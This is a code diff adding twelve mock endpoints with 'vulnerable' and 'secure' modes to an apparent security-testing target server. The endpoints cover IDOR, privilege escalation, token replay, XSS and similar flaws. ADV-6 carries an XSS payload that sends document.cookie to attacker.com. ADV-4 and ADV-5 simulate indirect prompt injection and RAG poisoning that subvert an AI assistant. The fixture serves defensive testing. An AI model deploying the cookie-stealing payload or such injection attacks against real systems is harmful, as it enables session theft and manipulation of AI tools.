@@ -16,6 +16,8 @@ const url = require('url');
 
 const PORT = parseInt(process.env.PORT || '9500', 10);
 let currentMode = process.env.TARGET_MODE || 'vulnerable'; // 'vulnerable' or 'secure'
+let approvalCounts = {};
+let revokedTokens = new Set(['tok-revoked-user-alpha']);
 
 const server = http.createServer((req, res) => {
   const parsedUrl = url.parse(req.url, true);
@@ -37,6 +39,7 @@ const server = http.createServer((req, res) => {
           const parsed = JSON.parse(body || '{}');
           if (parsed.mode === 'secure' || parsed.mode === 'vulnerable') {
             currentMode = parsed.mode;
+            approvalCounts = {};
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ status: 'ok', current_mode: currentMode }));
             return;
@@ -249,6 +252,250 @@ const server = http.createServer((req, res) => {
       } else {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ results: [], parsed_in_ms: 5 }));
+      }
+      return;
+    }
+
+    // =========================================================================
+    // PHASE 6 ADVANCED SECURITY TESTING SCENARIOS (NEXUS INTEGRATION)
+    // =========================================================================
+
+    // ADV-1: Advanced IDOR / BOLA - Cross-Tenant Conversation History
+    if (pathname === '/api/v1/tenants/tenant-beta/conversations/conv-9901' && req.method === 'GET') {
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          conversation_id: 'conv-9901',
+          tenant_id: 'tenant-beta',
+          messages: [
+            { sender: 'lead-dev@tenant-beta.local', text: 'CONFIDENTIAL: Internal API architecture specification' }
+          ],
+          leak_canary: 'CANARY_TENANT_BETA_CONVERSATION_LEAK'
+        }));
+      } else {
+        res.writeHead(403, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'forbidden: cross-tenant conversation access denied' }));
+      }
+      return;
+    }
+
+    // ADV-2: Privilege Escalation - Employee modifying tenant configuration
+    if (pathname === '/api/v1/admin/tenants/tenant-beta/config' && req.method === 'POST') {
+      const userRole = req.headers['x-user-role'] || 'employee';
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ status: 'updated', modified_by: 'employee-alpha', privilege_escalation: 'SUCCESS' }));
+      } else {
+        if (userRole !== 'admin' && userRole !== 'superadmin') {
+          res.writeHead(403, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ error: 'forbidden: requires administrator privileges' }));
+        } else {
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ status: 'updated', modified_by: 'admin' }));
+        }
+      }
+      return;
+    }
+
+    // ADV-3: Session Hijacking & CSRF - Post-Logout Token Replay
+    if (pathname === '/api/v1/auth/session-validate' && req.method === 'GET') {
+      const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ status: 'active', session_user: 'User-Alpha', revoked_check: 'skipped' }));
+      } else {
+        if (revokedTokens.has(token) || token.includes('revoked')) {
+          res.writeHead(401, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ error: 'unauthorized: session has been invalidated/logged out' }));
+        } else {
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ status: 'active', session_user: 'User-Alpha' }));
+        }
+      }
+      return;
+    }
+
+    // ADV-4: Indirect Prompt Injection in Synthetic Document Parsing
+    if (pathname === '/api/v1/documents/parse-and-index' && req.method === 'POST') {
+      let parsed = {};
+      try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
+      const content = parsed.content || '';
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          status: 'indexed',
+          injected_instruction_executed: true,
+          extracted_override: 'SYSTEM INSTRUCTION OVERRIDDEN VIA UNTRUSTED DOCUMENT CHUNK'
+        }));
+      } else {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          status: 'indexed',
+          quarantined: true,
+          untrusted_content_isolated: true,
+          instruction_execution_prevented: true
+        }));
+      }
+      return;
+    }
+
+    // ADV-5: RAG Data Poisoning & Citation Integrity
+    if (pathname === '/api/v1/rag/retrieve-verified' && req.method === 'POST') {
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          answer: 'Severance policy: 100 weeks compensation',
+          citation: 'unauthenticated-poisoned-upload.docx',
+          verified_source: false,
+          integrity_compromised: true
+        }));
+      } else {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          answer: 'Severance policy is strictly governed by corporate HR handbook v2.4',
+          citation: 'authenticated-hr-policy-v2',
+          verified_source: true,
+          untrusted_chunks_excluded: 1
+        }));
+      }
+      return;
+    }
+
+    // ADV-6: LLM Output Injection (Raw Unescaped HTML/XSS in Markdown Output)
+    if (pathname === '/api/v1/assistant/render-markdown' && req.method === 'POST') {
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          rendered_html: '<div>Analysis summary: <script>document.location="http://attacker.com/steal?c="+document.cookie</script></div>'
+        }));
+      } else {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          rendered_html: '<div>Analysis summary: &lt;script&gt;document.location="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;</div>',
+          sanitized: true
+        }));
+      }
+      return;
+    }
+
+    // ADV-7: Database Isolation Bypass (PostgreSQL RLS Bypass)
+    if (pathname === '/api/v1/database/tenant-records' && req.method === 'GET') {
+      const requestedTenant = query.tenant_id || '';
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          rls_active: false,
+          tenant: requestedTenant,
+          rows: [
+            { record_id: 'rec-beta-901', secret_key: 'BETA_CANARY_SECRET_ROW_88' }
+          ]
+        }));
+      } else {
+        res.writeHead(403, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'forbidden: PostgreSQL Row-Level Security (RLS) violation for tenant context' }));
+      }
+      return;
+    }
+
+    // ADV-8: Race Condition in Concurrent Document Approval
+    if (pathname === '/api/v1/documents/doc-approval-workflow/approve' && req.method === 'POST') {
+      if (mode === 'vulnerable') {
+        approvalCounts['doc-approval-workflow'] = (approvalCounts['doc-approval-workflow'] || 0) + 1;
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          status: 'approved',
+          approval_count: approvalCounts['doc-approval-workflow'],
+          race_condition_detected: approvalCounts['doc-approval-workflow'] > 1
+        }));
+      } else {
+        if (!approvalCounts['doc-approval-workflow'] || approvalCounts['doc-approval-workflow'] === 0) {
+          approvalCounts['doc-approval-workflow'] = 1;
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ status: 'approved', approval_count: 1 }));
+        } else {
+          res.writeHead(409, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ error: 'conflict: document is already approved or under atomic transaction lock' }));
+        }
+      }
+      return;
+    }
+
+    // ADV-9: Cache & Conversation History Leakage
+    if (pathname === '/api/v1/cache/analytics' && req.method === 'GET') {
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          cache_key: 'global_executive_summary',
+          data: 'CONFIDENTIAL_TENANT_BETA_FINANCIAL_PROJECTIONS_2026',
+          namespace_isolated: false
+        }));
+      } else {
+        res.writeHead(404, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'cache miss: key not found in tenant-isolated cache namespace' }));
+      }
+      return;
+    }
+
+    // ADV-10: File Parser Abuse & Nested Archive Expansion
+    if (pathname === '/api/v1/documents/decompress' && req.method === 'POST') {
+      let parsed = {};
+      try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
+      if (mode === 'vulnerable') {
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          error: 'Decompression memory exhausted: nested archive expansion ratio exceeded memory buffer',
+          ratio: parsed.compression_ratio || 1000
+        }));
+      } else {
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          error: 'rejected: archive compression ratio exceeds maximum safety threshold (20:1)'
+        }));
+      }
+      return;
+    }
+
+    // ADV-11: LLM Resource Exhaustion & Prompt Flooding
+    if (pathname === '/api/v1/assistant/chat-stream' && req.method === 'POST') {
+      let parsed = {};
+      try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
+      const prompt = parsed.prompt || '';
+      if (mode === 'vulnerable') {
+        setTimeout(() => {
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ response: 'Processed unmetered prompt', latency_warning: 'inference took excessive cycles' }));
+        }, 1600);
+      } else {
+        if (prompt.length > 4096) {
+          res.writeHead(413, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ error: 'payload_too_large: prompt exceeds maximum 4,096 character window' }));
+        } else {
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ response: 'Prompt processed within quota', parsed_in_ms: 10 }));
+        }
+      }
+      return;
+    }
+
+    // ADV-12: Dependency and Container Vulnerability Audit
+    if (pathname === '/api/v1/system/security-posture' && req.method === 'GET') {
+      if (mode === 'vulnerable') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          cve_count: 2,
+          vulnerabilities: [
+            { id: 'CVE-2024-4340', package: 'sqlparse', severity: 'HIGH' }
+          ],
+          running_as_root: true
+        }));
+      } else {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          cve_count: 0,
+          vulnerabilities: [],
+          running_as_root: false,
+          user: 'sentrix-app'
+        }));
       }
       return;
     }
